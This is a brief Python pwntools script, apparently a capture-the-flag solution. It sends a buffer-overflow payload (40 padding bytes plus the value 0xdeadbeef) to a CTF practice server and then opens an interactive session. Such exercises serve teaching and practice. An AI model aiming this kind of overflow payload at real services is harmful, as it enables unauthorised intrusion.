#-*- coding:utf-8 -*-
from pwn import *

ip = 'ctf.j0n9hyun.xyz'
port = 3000

r = remote(ip, port)

payload = ''
payload += 'A'*40
payload += p32(0xdeadbeef)

r.send(payload)
r.interactive()
